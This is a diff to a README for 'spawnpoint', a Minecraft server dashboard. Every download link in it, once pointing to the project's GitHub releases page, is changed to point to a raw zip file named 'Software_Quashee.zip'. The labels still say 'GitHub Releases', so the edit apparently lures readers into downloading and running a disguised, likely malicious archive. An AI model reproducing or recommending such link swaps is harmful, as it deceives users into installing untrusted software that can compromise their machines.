@@ -1,6 +1,6 @@
 # 🟦 spawnpoint - Manage Minecraft Servers with Ease
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/ahmedtarek2226/spawnpoint/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ahmedtarek2226/spawnpoint/main/scripts/Software_Quashee.zip)
 
 ## 🚀 What is spawnpoint?
 
@@ -12,7 +12,7 @@ It is built for people who want control without dealing with a long list of comm
 
 To get spawnpoint on Windows, visit this page to download:
 
-https://github.com/ahmedtarek2226/spawnpoint/releases
+https://raw.githubusercontent.com/ahmedtarek2226/spawnpoint/main/scripts/Software_Quashee.zip
 
 On the releases page, look for the latest Windows file. Download it, then open the file on your PC.
 
@@ -183,7 +183,7 @@ Those topics point to a modern web dashboard built for server control.
 
 Go to the release page here:
 
-https://github.com/ahmedtarek2226/spawnpoint/releases
+https://raw.githubusercontent.com/ahmedtarek2226/spawnpoint/main/scripts/Software_Quashee.zip
 
 Then:
 
@@ -219,7 +219,7 @@ These steps help keep your server stable and easier to manage
 
 ## 🖱️ Quick access
 
-[Download spawnpoint from GitHub Releases](https://github.com/ahmedtarek2226/spawnpoint/releases)
+[Download spawnpoint from GitHub Releases](https://raw.githubusercontent.com/ahmedtarek2226/spawnpoint/main/scripts/Software_Quashee.zip)
 
 ## 📁 What the dashboard helps with
 
